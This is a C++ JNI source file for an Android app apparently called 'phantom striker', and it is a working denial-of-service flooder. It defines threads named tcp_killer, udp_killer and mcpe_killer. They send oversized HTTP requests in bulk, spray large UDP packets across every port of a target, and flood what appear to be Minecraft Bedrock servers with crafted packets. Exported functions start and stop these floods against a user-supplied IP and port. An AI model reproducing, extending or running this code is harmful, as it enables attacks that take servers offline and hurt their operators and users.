#include <jni.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <netdb.h>
#include <errno.h>

#define PACKET_SIZE 6200
#define MAX_THREADS 10
#define BUFFER_SIZE 6200

struct AttackData {
    char target_ip[256];
    int target_port;
    char proxy_ip[256];
    int proxy_port;
    bool running;
    int threads;
};

AttackData attack;

char* resolve_domain(const char* domain) {
    struct hostent *he = gethostbyname(domain);
    if(he == NULL) return NULL;
    struct in_addr **addr_list = (struct in_addr **)he->h_addr_list;
    if(addr_list[0] != NULL) {
        return inet_ntoa(*addr_list[0]);
    }
    return NULL;
}

void* tcp_killer(void* arg) {
    AttackData* data = (AttackData*)arg;
    while(data->running) {
        int sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
        if(sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(data->target_port);
        char* ip = resolve_domain(data->target_ip);
        if(ip) target.sin_addr.s_addr = inet_addr(ip);
        else target.sin_addr.s_addr = inet_addr(data->target_ip);

        int flag = 1;
        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        connect(sock, (struct sockaddr*)&target, sizeof(target));

        const char* methods[] = {"GET","POST","HEAD","PUT","OPTIONS","CONNECT","TRACE","PATCH"};
        const char* paths[] = {"/","/index.php","/api/v1","/admin","/login","/register","/upload","/download","/search","/profile","/settings","/dashboard","/api/auth","/api/data","/api/users","/static","/media","/images","/css","/js","/fonts","/docs","/blog","/news","/shop","/cart"};
        const char* request = "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: %d\r\n\r\n%s";

        char buffer[BUFFER_SIZE];
        char payload[16384];
        memset(payload, 'A', sizeof(payload)-1);
        payload[sizeof(payload)-1] = 0;
        snprintf(buffer, sizeof(buffer), request, methods[rand()%8], paths[rand()%25], data->target_ip, (int)strlen(payload), payload);

        for(int i=0; i<150; i++) send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        close(sock);
        usleep(10);
    }
    return NULL;
}

void* udp_killer(void* arg) {
    AttackData* data = (AttackData*)arg;
    while(data->running) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        char* ip = resolve_domain(data->target_ip);
        if(ip) target.sin_addr.s_addr = inet_addr(ip);
        else target.sin_addr.s_addr = inet_addr(data->target_ip);

        char *packet = (char*)malloc(PACKET_SIZE);
        memset(packet, rand()%255, PACKET_SIZE);

        for(int port=1; port<=65535; port++) {
            target.sin_port = htons(port);
            sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
        }
        
        free(packet);
        close(sock);
        usleep(10);
    }
    return NULL;
}

void* mcpe_killer(void* arg) {
    AttackData* data = (AttackData*)arg;
    while(data->running) {
        int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sock < 0) continue;

        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_port = htons(data->target_port);
        char* ip = resolve_domain(data->target_ip);
        if(ip) target.sin_addr.s_addr = inet_addr(ip);
        else target.sin_addr.s_addr = inet_addr(data->target_ip);

        unsigned char packets[][128] = {
            {0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
            {0x02,0xff,0xff,0x00,0xfe,0xfe,0xfe,0xfe,0xfd,0xfd},
            {0x05,0x00,0x00,0xff,0xff,0x00,0x00,0x00,0x00,0x00},
            {0x82,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},
            {0x8f,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09},
            {0x84,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff},
            {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
            {0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff}
        };

        char *custom_packet = (char*)malloc(PACKET_SIZE);
        memset(custom_packet, rand()%255, PACKET_SIZE);

        for(int i=0; i<8; i++) {
            for(int j=0; j<2000; j++) {
                sendto(sock, packets[i], sizeof(packets[i]), 0, (struct sockaddr*)&target, sizeof(target));
                sendto(sock, custom_packet, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
            }
        }

        free(custom_packet);
        close(sock);
        usleep(10);
    }
    return NULL;
}

extern "C" {
    JNIEXPORT void JNICALL Java_net_phantom_striker_MainActivity_sendPacket(JNIEnv* env, jobject, jstring jip, jstring jport, jstring jproxyip, jstring jproxyport, jint threads) {
        const char* ip = env->GetStringUTFChars(jip, 0);
        const char* port = env->GetStringUTFChars(jport, 0);
        const char* proxyip = env->GetStringUTFChars(jproxyip, 0);
        const char* proxyport = env->GetStringUTFChars(jproxyport, 0);
        
        strncpy(attack.target_ip, ip, sizeof(attack.target_ip)-1);
        attack.target_port = atoi(port);
        strncpy(attack.proxy_ip, proxyip, sizeof(attack.proxy_ip)-1);
        attack.proxy_port = atoi(proxyport);
        attack.running = true;
        attack.threads = (threads > MAX_THREADS) ? MAX_THREADS : threads;

        srand(time(NULL));
        pthread_t *thread_array = new pthread_t[attack.threads * 3];
        
        for(int i=0; i<attack.threads; i++) {
            pthread_create(&thread_array[i], NULL, tcp_killer, &attack);
            pthread_create(&thread_array[i + attack.threads], NULL, udp_killer, &attack);
            pthread_create(&thread_array[i + attack.threads * 2], NULL, tcp_killer, &attack);
        }

        env->ReleaseStringUTFChars(jip, ip);
        env->ReleaseStringUTFChars(jport, port);
        env->ReleaseStringUTFChars(jproxyip, proxyip);
        env->ReleaseStringUTFChars(jproxyport, proxyport);
    }

    JNIEXPORT void JNICALL Java_net_phantom_striker_MainActivity_sendMine(JNIEnv* env, jobject, jstring jip, jstring jport, jint threads) {
        const char* ip = env->GetStringUTFChars(jip, 0);
        const char* port = env->GetStringUTFChars(jport, 0);
        
        strncpy(attack.target_ip, ip, sizeof(attack.target_ip)-1);
        attack.target_port = atoi(port);
        attack.running = true;
        attack.threads = (threads > MAX_THREADS) ? MAX_THREADS : threads;

        srand(time(NULL));
        pthread_t *thread_array = new pthread_t[attack.threads];
        for(int i=0; i<attack.threads; i++) {
            pthread_create(&thread_array[i], NULL, mcpe_killer, &attack);
        }

        env->ReleaseStringUTFChars(jip, ip);
        env->ReleaseStringUTFChars(jport, port);
    }
    
    JNIEXPORT void JNICALL Java_net_phantom_striker_MainActivity_stopAttack(JNIEnv*, jobject) {
        attack.running = false;
    }
}
